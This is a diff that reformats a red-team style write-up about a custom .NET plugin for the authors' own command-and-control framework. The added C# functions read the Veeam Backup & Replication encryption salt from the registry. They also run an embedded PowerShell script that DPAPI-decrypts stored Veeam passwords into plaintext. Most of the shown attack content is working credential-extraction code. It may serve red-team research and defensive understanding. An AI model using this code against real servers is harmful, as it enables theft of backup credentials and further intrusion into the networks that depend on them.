@@ -31,7 +31,35 @@ We wrote a custom dot net plugin that works with our custom C2 that’s capable 
 
 ## Retrieving the EncryptionSalt from the Registry
 
-public static string GetVeeamData**()** **{**     string keyPath **\=** @”SOFTWARE\\Veeam\\Veeam Backup and Replication\\Data”**;**       using **(**RegistryKey baseKey **\=** RegistryKey**.**OpenBaseKey**(**RegistryHive**.**LocalMachine**,** RegistryView**.**Registry64**))**     using **(**RegistryKey key **\=** baseKey**.**OpenSubKey**(**keyPath**))**     **{**         if **(**key **\==** null**)**             return “Key not found.”**;**           StringBuilder sb **\=** new StringBuilder**();**         foreach **(**string valueName in key**.**GetValueNames**())**         **{**             object value **\=** key**.**GetValue**(**valueName**);**             sb**.**AppendLine**(**$”{valueName} : {value}”**);**         **}**           return sb**.**ToString**();**     **}** **}**   public static string printhello**(**string name**)** **{**     string output **\=** GetVeeamData**();**     return output**;** **}**  
+```csharp
+
+public static string GetVeeamData()
+{
+    string keyPath = @"SOFTWARE\Veeam\Veeam Backup and Replication\Data";
+    
+    using (RegistryKey baseKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
+    using (RegistryKey key = baseKey.OpenSubKey(keyPath))
+    {
+        if (key == null)
+            return "Key not found.";
+        
+        StringBuilder sb = new StringBuilder();
+        foreach (string valueName in key.GetValueNames())
+        {
+            object value = key.GetValue(valueName);
+            sb.AppendLine($"{valueName} : {value}");
+        }
+        
+        return sb.ToString();
+    }
+}
+
+public static string printhello(string name)
+{
+    string output = GetVeeamData();
+    return output;
+}
+```
 
 This code snippet is used to extract Veeam Backup & Replication configuration data directly from the Windows Registry. Veeam stores several internal values under the registry path:
 
@@ -63,7 +91,44 @@ get encrypted password from postgres db
 
 ## Decrypting the Passwords Using the Retrieved Salt and the Windows DPAPI Mechanism
 
-        public static string DecryptVeeamPasswordPowerhshell**(**string context**,** string saltBase**)**         **{**             using **(**var ps **\=** PowerShell**.**Create**())**             **{**                 string script **\=** @” param($context, $saltbase) Add-Type -AssemblyName System.Security $salt = \[System.Convert\]::FromBase64String($saltbase) $data = \[System.Convert\]::FromBase64String($context) $hex = New-Object -TypeName System.Text.StringBuilder -ArgumentList ($data.Length \* 2) foreach ($byte in $data) { $hex.AppendFormat(‘{0:x2}’, $byte) > $null } $hex = $hex.ToString().Substring(74,$hex.Length-74) $data = New-Object -TypeName byte\[\] -ArgumentList ($hex.Length / 2) for ($i = 0; $i -lt $hex.Length; $i += 2) { $data\[$i / 2\] = \[System.Convert\]::ToByte($hex.Substring($i, 2), 16) } $securedPassword = \[System.Convert\]::ToBase64String($data) $data = \[System.Convert\]::FromBase64String($securedPassword) $local = \[System.Security.Cryptography.DataProtectionScope\]::LocalMachine $raw = \[System.Security.Cryptography.ProtectedData\]::Unprotect($data, $salt, $local) \[System.Text.Encoding\]::UTF8.GetString($raw) “**;**                 ps**.**AddScript**(**script**).**AddParameter**(**“context”**,** context**).**AddParameter**(**“saltbase”**,** saltBase**).**AddCommand**(**“Out-String”**);**                 var results **\=** ps**.**Invoke**();**                 if **(**ps**.**HadErrors**)** throw new Exception**(**string**.**Join**(**“\\n”**,** ps**.**Streams**.**Error**.**Select**(**e **\=>** e**.**ToString**())));**                 return string**.**Join**(**“”**,** results**.**Select**(**r **\=>** r**.**ToString**()));**             **}**         **}**  
+```csharp
+
+public static string DecryptVeeamPasswordPowershell(string context, string saltBase)
+{
+    using (var ps = PowerShell.Create())
+    {
+        string script = @"
+            param($context, $saltbase)
+            Add-Type -AssemblyName System.Security
+            $salt = [System.Convert]::FromBase64String($saltbase)
+            $data = [System.Convert]::FromBase64String($context)
+            $hex = New-Object -TypeName System.Text.StringBuilder -ArgumentList ($data.Length * 2)
+            foreach ($byte in $data) {
+                $hex.AppendFormat('{0:x2}', $byte) > $null
+            }
+            $hex = $hex.ToString().Substring(74,$hex.Length-74)
+            $data = New-Object -TypeName byte[] -ArgumentList ($hex.Length / 2)
+            for ($i = 0; $i -lt $hex.Length; $i += 2) {
+                $data[$i / 2] = [System.Convert]::ToByte($hex.Substring($i, 2), 16)
+            }
+            $securedPassword = [System.Convert]::ToBase64String($data)
+            $data = [System.Convert]::FromBase64String($securedPassword)
+            $local = [System.Security.Cryptography.DataProtectionScope]::LocalMachine
+            $raw = [System.Security.Cryptography.ProtectedData]::Unprotect($data, $salt, $local)
+            [System.Text.Encoding]::UTF8.GetString($raw)
+        ";
+        
+        ps.AddScript(script).AddParameter("context", context).AddParameter("saltbase", saltBase).AddCommand("Out-String");
+        
+        var results = ps.Invoke();
+        
+        if (ps.HadErrors)
+            throw new Exception(string.Join("\n", ps.Streams.Error.Select(e => e.ToString())));
+        
+        return string.Join("", results.Select(r => r.ToString()));
+    }
+}
+```
 
 This function demonstrates how Veeam-encrypted credentials can be programmatically decrypted by combining a C# wrapper with an embedded PowerShell script. Veeam relies on Windows DPAPI (LocalMachine scope) along with a registry-stored salt to protect stored passwords. Once you obtain the encrypted blob and the encryption salt, this function reconstructs the plaintext password.
 
